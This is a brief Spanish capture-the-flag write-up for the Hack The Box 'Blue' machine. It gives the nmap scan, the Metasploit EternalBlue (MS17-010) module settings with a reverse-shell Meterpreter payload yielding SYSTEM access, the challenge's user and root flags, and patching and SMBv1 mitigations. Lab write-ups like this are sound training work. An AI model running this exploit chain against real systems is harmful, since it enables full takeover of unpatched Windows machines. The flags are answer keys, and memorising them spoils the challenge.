
```text
Write-up: Blue (Hack The Box)
Fecha: 10 de Enero, 2026
Sistema Operativo: Windows
Dificultad: Fácil
Vulnerabilidad: MS17-010 (EternalBlue)

1. Reconocimiento (Enumeración)
IP objetivo: 10.129.33.101
Comando: nmap -sV -sC -p- 10.129.33.101

Resultados:
- Puerto 445 (SMB) abierto.
- Vulnerable a ms17-010.

2. Explotación (Metasploit)
Módulo: use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.33.101
set LHOST tun0
set payload windows/x64/meterpreter/reverse_tcp
Resultado: Sesión de Meterpreter como NT AUTHORITY\SYSTEM.

3. Flags
User Flag: c5ee5dc4ddde439ec1ffc126b58fb63c
Root Flag: f79f0f05f717b836dcfeb859bca0fd92

4. Mitigación
- Instalar parche MS17-010.
- Deshabilitar SMBv1.
- Restringir puerto 445 en Firewall.
```
